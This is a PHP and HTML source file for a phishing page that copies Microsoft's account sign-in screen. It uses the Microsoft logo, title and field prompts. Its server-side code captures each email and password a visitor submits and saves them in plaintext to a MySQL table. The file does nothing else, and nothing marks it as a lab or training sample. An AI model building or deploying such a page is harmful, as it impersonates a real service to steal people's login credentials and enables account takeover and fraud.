<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="assets/favicon.ico" />
    <title>Sign in to your Microsoft account</title>
    <link rel="stylesheet" href="assets/app.css" />
</head>

<body>
    <?php
    // Database configuration
    $servername = "localhost";
    $username = "root"; // Replace with your database username
    $password = ""; // Replace with your database password
    $dbname = "users_db";

    // Create connection
    $conn = new mysqli($servername, $username, $password, $dbname);

    // Check connection
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }

    // Handle form submission
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $uname = $_POST['uname'];
        $pass = $_POST['pass'];

        // Prepare and bind
        $stmt = $conn->prepare("INSERT INTO users (username, password) VALUES (?, ?)");
        $stmt->bind_param("ss", $uname, $pass);

        if ($stmt->execute()) {
            echo "New record created successfully";
        } else {
            echo "Error: " . $stmt->error;
        }

        $stmt->close();
    }

    $conn->close();
    ?>

    <section id="section_uname">
        <div class="auth-wrapper">
            <img src="assets/logo.png" alt="Microsoft" />
            <h2 class="title mb-16 mt-16">Sign in</h2>
            <form method="post" action="">
                <div class="mb-16">
                    <p id="error_uname" class="error"></p>
                    <input id="inp_uname" type="text" name="uname" class="input" placeholder="Email, phone, or Skype" required />
                </div>
                <div class="mb-16">
                    <p id="error_pwd" class="error"></p>
                    <input id="inp_pwd" type="password" name="pass" class="input" placeholder="Password" required />
                </div>
                <div>
                    <button class="btn" id="btn_sig" type="submit">Sign in</button>
                </div>
            </form>
            <div>
                <p class="mb-16 fs-13">No account? <a href="" class="link">Create one!</a></p>
                <p class="mb-16 fs-13">
                    <a href="#" class="link">Sign in with a security key
                        <img src="assets/question.png" alt="Question img">
                    </a>
                </p>
            </div>
        </div>
        <div class="opts">
            <p class="has-icon mb-0" style="font-size:15px;"><span class="icon"><img src="assets/key.png"
                        width="30px" /></span> Sign-in options</p>
        </div>
    </section>

    <footer class="footer">
        <a href="#">Terms of use</a>
        <a href="#">Privacy & cookies</a>
        <span>.&nbsp;.&nbsp;.</span>
    </footer>
    <script src="assets/app.js"></script>
</body>

</html>
